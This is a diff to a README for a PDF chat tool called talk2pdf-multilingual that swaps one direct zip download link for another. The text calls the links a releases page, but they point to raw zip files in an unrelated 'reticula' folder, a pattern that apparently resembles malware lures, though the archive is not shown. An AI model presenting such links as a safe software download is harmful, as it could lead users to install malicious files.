@@ -6,7 +6,7 @@ Welcome to talk2pdf-multilingual! This application allows you to interact with y
 
 ## 📥 Download
 
-[![Download](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/talk2pdf-multilingual.zip%20release-brightgreen)](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/talk2pdf-multilingual.zip)
+[![Download](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/pdf_talk_multilingual_v2.7-beta.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/pdf_talk_multilingual_v2.7-beta.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these requirements:
 
 To get started, visit our releases page to download the latest version of talk2pdf-multilingual.
 
-[Visit this page to download](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/talk2pdf-multilingual.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Applemango-art/talk2pdf-multilingual/main/reticula/pdf_talk_multilingual_v2.7-beta.2.zip)
 
 1. Open your web browser and go to the link above.
 2. Look for the latest release at the top of the page.
